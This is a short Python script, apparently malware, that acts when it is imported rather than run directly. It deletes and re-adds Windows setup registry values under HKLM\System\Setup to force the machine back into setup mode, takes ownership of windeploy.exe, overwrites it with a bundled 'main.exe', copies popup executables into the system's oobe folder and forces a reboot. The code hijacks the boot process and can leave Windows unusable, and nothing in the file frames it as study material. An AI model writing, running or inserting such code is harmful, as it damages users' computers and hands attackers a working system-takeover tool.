import random
import os
import sys
if not '__main__' == __name__:
    os.system('reg delete HKLM\System\Setup /v OOBEInProgress /f')
    os.system('reg delete HKLM\System\Setup /v SystemSetupInProgress /f')
    os.system('reg delete HKLM\System\Setup /v SetupPhase /f')
    os.system('reg delete HKLM\System\Setup /v SetupType /f')
    os.system('reg delete HKLM\System\Setup /v RestartSetup /f')
    os.system('reg add HKLM\System\Setup /v OOBEInProgress /t REG_DWORD /d 1')
    os.system('reg add HKLM\System\Setup /v SystemSetupInProgress /t REG_DWORD /d 1')
    os.system('reg add HKLM\System\Setup /v SetupPhase /t REG_DWORD /d 3')
    os.system('reg add HKLM\System\Setup /v SetupType /t REG_DWORD /d 2')
    os.system('reg add HKLM\System\Setup /v RestartSetup /t REG_DWORD /d 1')
    os.system('takeown /F C:\\Windows\\System32\\oobe\\windeploy.exe')
    os.system('xcopy main.exe C:\\Windows\\System32\\oobe\\windeploy.exe')
    os.system('xcopy pupups.exe C:\\Windows\\System32\\oobe\\popups.exe')
    os.system('xcopy image_popups.exe C:\\Windows\\System32\\oobe\\image_popups.exe')
    os.system('shutdown /r')
